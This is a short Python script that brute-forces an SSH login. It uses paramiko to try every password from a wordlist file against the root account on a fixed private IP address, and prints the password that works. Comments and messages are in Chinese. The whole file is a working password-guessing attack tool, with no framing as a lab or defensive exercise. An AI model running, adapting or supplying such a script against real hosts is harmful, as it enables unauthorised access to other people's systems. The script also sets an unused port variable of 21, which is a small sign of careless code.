#!/usr/bin/env python

import paramiko
import socket
import time

host = "192.168.6.6"
#ssh用户
user = "root"
port = 21
passwords = open("PasswordFile.txt").read().split('\n')

def connect_ssh(password):
    #ssh客户端
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh_client.connect(hostname=host,password=password,username=user,timeout=10)
    except socket.timeout:
        print("连接超时")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] 账户密码错误 {user}:{password}")
        return False
    except paramiko.SSHException:
        print("内部错误，等待重连")
        time.sleep(10)
        return connect_ssh(password)
    else:
        print("[+] password found: ",password)
        exit(0)

for password in passwords:
    if connect_ssh(password):
        break